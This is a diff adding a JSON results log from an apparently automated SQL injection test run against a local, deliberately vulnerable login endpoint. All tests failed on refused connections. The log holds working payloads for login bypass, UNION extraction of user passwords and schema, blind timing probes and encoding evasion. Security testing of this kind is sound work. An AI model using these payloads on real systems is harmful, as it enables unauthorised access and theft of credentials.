@@ -1,0 +1,190 @@
+{
+  "metadata": {
+    "start_time": "2026-05-12T07:48:59.414581",
+    "target": "http://localhost:5001",
+    "phases_run": [],
+    "end_time": "2026-05-12T07:51:01.296714"
+  },
+  "phases": {
+    "phase_1": [
+      {
+        "test_name": "Basic Error Detection",
+        "payload": "admin'",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E61690>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "AND 1=1 Condition",
+        "payload": "admin' AND 1=1 --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E639D0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "AND 1=2 Condition",
+        "payload": "admin' AND 1=2 --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E62950>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Database Version",
+        "payload": "' UNION SELECT @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E607D0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Database Name",
+        "payload": "' UNION SELECT database(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E758D0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Current User",
+        "payload": "' UNION SELECT user(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E77B90>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      }
+    ],
+    "phase_2": [
+      {
+        "test_name": "Admin Comment Bypass",
+        "payload": "admin' --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E7DF10>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Always True OR",
+        "payload": "' OR '1'='1' --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E46490>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Admin OR True",
+        "payload": "admin' OR '1'='1' --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E77610>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Numeric OR True",
+        "payload": "' OR 1=1 --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E75CD0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Block Comment",
+        "payload": "admin'/*",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E618D0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Hash Comment",
+        "payload": "admin' #",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E7DED0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      }
+    ],
+    "phase_3": [
+      {
+        "test_name": "UNION Column Test 1",
+        "payload": "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E88590>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Extract All Users",
+        "payload": "' UNION SELECT id, username, email, password, role, lastLogin, isActive, createdAt, updatedAt FROM Users --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E62850>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Extract Admin Password",
+        "payload": "' UNION SELECT id, username, email, password, role, NULL, NULL, NULL, NULL FROM Users WHERE role='admin' --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E61750>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "List Tables",
+        "payload": "' UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = database() --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E75D50>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "List Users Columns",
+        "payload": "' UNION SELECT column_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'Users' --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E778D0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Extract Articles",
+        "payload": "' UNION SELECT id, title, content, category, authorId, createdAt, updatedAt, NULL, NULL FROM Articles --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E7CFD0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      }
+    ],
+    "phase_4": [
+      {
+        "test_name": "Time-Based True",
+        "payload": "admin' AND IF(1=1, SLEEP(2), 0) --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E45990>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false,
+        "actual_delay": 4.045658111572266
+      },
+      {
+        "test_name": "Time-Based False",
+        "payload": "admin' AND IF(1=2, SLEEP(2), 0) --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E46310>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false,
+        "actual_delay": 4.0502166748046875
+      },
+      {
+        "test_name": "Boolean True",
+        "payload": "admin' AND '1'='1' --",
+        "error": "('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))",
+        "success": false,
+        "actual_delay": 2.748020887374878
+      },
+      {
+        "test_name": "Boolean False",
+        "payload": "admin' AND '1'='2' --",
+        "error": "('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))",
+        "success": false,
+        "actual_delay": 0.0031228065490722656
+      }
+    ],
+    "phase_5": [
+      {
+        "test_name": "CONCAT All Users",
+        "payload": "' UNION SELECT CONCAT(username, ':', email, ':', password, ':', role), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E7CAD0>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "GROUP_CONCAT All",
+        "payload": "' UNION SELECT GROUP_CONCAT(CONCAT(username, '|', email, '|', password) SEPARATOR '; '), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM Users --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E7C190>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      }
+    ],
+    "phase_6": [],
+    "phase_7": [],
+    "phase_9": [
+      {
+        "test_name": "URL Encoding",
+        "payload": "%27%20OR%20%271%27%3D%271",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E63390>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Case Variation",
+        "payload": "AdMiN' --",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E62890>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      },
+      {
+        "test_name": "Double Comment",
+        "payload": "admin'/**/--",
+        "error": "HTTPConnectionPool(host='localhost', port=5001): Max retries exceeded with url: /api/vulnerable/login (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001CE30E7D390>: Failed to establish a new connection: [WinError 10061] Aucune connexion n\u2019a pu \u00eatre \u00e9tablie car l\u2019ordinateur cible l\u2019a express\u00e9ment refus\u00e9e'))",
+        "success": false
+      }
+    ]
+  }
+}
